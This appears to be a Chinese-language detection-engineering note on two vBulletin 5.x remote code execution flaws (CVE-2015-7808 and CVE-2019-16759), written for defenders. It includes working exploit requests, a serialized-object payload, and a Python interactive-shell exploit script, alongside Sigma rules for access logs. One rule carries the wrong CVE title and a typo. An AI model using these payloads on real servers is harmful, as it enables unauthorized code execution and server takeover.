# T1190-vBulletin5.X-RCE检测

## 来自ATT&CK的描述

使用软件，数据或命令来利用面向Internet的计算机系统或程序中的弱点，从而导致意外或无法预期的行为。系统的弱点可能是错误、故障或设计漏洞。这些应用程序通常是网站，但是可以包括数据库（例如SQL），标准服务（例如SMB 或SSH）以及具有Internet可访问开放的任何其他应用程序，例如Web服务器和相关服务。根据所利用的缺陷，这可能包括“利用防御防卫”。

如果应用程序托管在基于云的基础架构上，则对其进行利用可能会导致基础实际应用受到损害。这可以使攻击者获得访问云API或利用弱身份和访问管理策略的路径。

对于网站和数据库，OWASP排名前10位和CWE排名前25位突出了最常见的基于Web的漏洞。

## CVE-2015-7808漏洞

vBulletin是用PHP编写的可定制的论坛程序套件。

vBulletin 5.1.4-5.1.9版本，某些内部API处理Ajax请求时，未验证其来源，这可使攻击者无需身份验证调用继承自vB_Api及/core/vb/api/下任意类的任意公共方法，其中decodeArguments()方法内的unserialize()函数存在安全漏洞，可使攻击者在‘$args’变量中注入精心构造的任意对象，远程执行php代码，获取服务器权限。

### 影响版本

VBulletin 5.1.4 - 5.1.9

### 测试案例

请参考：

vBulletin5.X前台RCE分析（CVE-2015-7808）

<https://xz.aliyun.com/t/6497>

vBulletin 5 全版本远程代码执行漏洞分析

<https://www.anquanke.com/post/id/82870>

### 检测日志

访问日志

### 测试复现

```yml
GET /vBulletin/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A9%3A%22phpinfo%28%29%22%3B%7D HTTP/1.1
Host: 192.168.0.106
Cookie: XDEBUG_SESSION=PHPSTORM
Connection: close
```

解码后：

```yml
GET /vBulletin/ajax/api/hook/decodeArguments?arguments=O:12:"vB_dB_Result":2:{s:5:"*db";O:17:"vB_Database_MySQL":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"assert";}}s:12:"*recordset";s:9:"phpinfo()";} HTTP/1.1
```

### 测试留痕

暂无

### 检测规则/思路

sigma规则

```yml
title: vBulletin5.X-CVE-2015-7808-RCE-检测规则
description: 通过访问日志检测CVE-2015-7808远程命令执行漏洞利用行为
translator: 12306Bro
date: 2020/12/16
status: experimental
references:
    - https://xz.aliyun.com/t/6497
logsource:
    category: webserver
detection:
    selection:
        c-uri:
            - '*/ajax/api/hook/decodeArguments?arguments=*'
    condition: selection
fields:
    - c-ip
    - c-dns
falsepositives:
    - Unknown
level: critical
```

## CVE-2019-16759

近期，vBulletin披露了一个最新的0 day漏洞细节，这个漏洞分配的CVE编号为CVE-2019-16759。与此同时，Unit 42的安全研究人员也在网上发现了有很多攻击者正在利用该漏洞来实施攻击。在该漏洞的帮助下，未经身份验证的攻击者将能够访问和控制运行了v5.0.0至v5.5.4版本vBulletin的服务器，并且阻止网络管理员访问这些服务器。目前，使用了vBulletin的网站数量大约有10万多个，其中包括很多大型企业、组织和论坛，因此该漏洞应当立刻被修复。

### 影响范围

仅影响 vBulletin 5.x 版本

### 测试记录

请参考：

CVE-2019-16759漏洞在野利用

<https://www.anquanke.com/post/id/189470>

CVE-2019-16759 vBulletin 5.x RCE 复现

<https://blog.csdn.net/weixin_41064688/article/details/108060313>

CVE-2019-16759 vBulletin 5.x 未授权远程代码执行漏洞

<https://github.com/jas502n/CVE-2019-16759>

### 检测日志类型

访问日志 OR HTTP.log

### 测试复现过程

POC1

```yml
http://IP/?routestring=ajax%2Frender%2Fwidget_php&widgetConfig[code]=phpinfo();exit;
```

POC2:CVE-2019-16759 vBulletin 5.x 未授权远程代码执行漏洞

```python
import requests
import sys

if len(sys.argv) != 2:
    sys.exit("Usage: %s <URL to vBulletin>" % sys.argv[0])

proxies ={
     "http":"http://127.0.0.1:8080/"
}
params = {"routestring":"ajax/render/widget_php"}

while True:
     try:
          cmd = raw_input(">>>Shell= ")
          params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"');echo md5('vBulletin'); exit;"
          r = requests.post(url = sys.argv[1], data = params, proxies=proxies)
          if r.status_code == 200 or r.status_code ==403 and 'be4ea51d962be8308a0099ae1eb3ec63' in r.text:
               print
               print r.text.split('be4ea51d962be8308a0099ae1eb3ec63')[0]
          else:
               sys.exit("Exploit failed! :(")
     except KeyboardInterrupt:
          sys.exit("\nClosing shell...")
     except Exception, e:
          sys.exit(str(e))

```

### 测试痕迹

暂无，但可查看攻击报文样例辅助安全人员研判是否为攻击行为，较简单的场景。

<https://github.com/jas502n/CVE-2019-16759>

### 检测规则

sigma规则

```yml
title: vBulletin5.X-CVE-2015-7808-RCE-检测规则
description: 通过访问日志检测CVE-2015-7808远程命令执行漏洞利用行为
translator: 12306Bro
date: 2020/12/16
status: experimental
references:
    - https://github.com/jas502n/CVE-2019-16759
    - https://blog.csdn.net/weixin_41064688/article/details/108060313
logsource:
    category: webserver
detection:
    selection1:
        c-uri:
            - '*?routestring=ajax%2Frender%2Fwidget_php&widgetConfig*' #匹配此特征
    selection2:
        body:
            - '*routestring=ajax/render/widget_php&widgetConfig[code]=die(@mid5(*))' #根据报文内容进行判断，多为post
    condition: selection1 or selection2
fields:
    - c-ip
    - c-dns
falsepositives:
    - Unknown
level: critical
```

## 备注

在进行部分攻击日志分析时，遇到此漏洞特征，仅做记录。

## 参考推荐

MITRE-ATT&CK-T1190

<https://attack.mitre.org/techniques/T1190/>

vBulletin5.X前台RCE分析（CVE-2015-7808）

<https://xz.aliyun.com/t/6497>

vBulletin 5 全版本远程代码执行漏洞分析

<https://www.anquanke.com/post/id/82870>

CVE-2019-16759漏洞在野利用

<https://www.anquanke.com/post/id/189470>

CVE-2019-16759 vBulletin 5.x RCE 复现

<https://blog.csdn.net/weixin_41064688/article/details/108060313>

CVE-2019-16759 vBulletin 5.x 未授权远程代码执行漏洞

<https://github.com/jas502n/CVE-2019-16759>
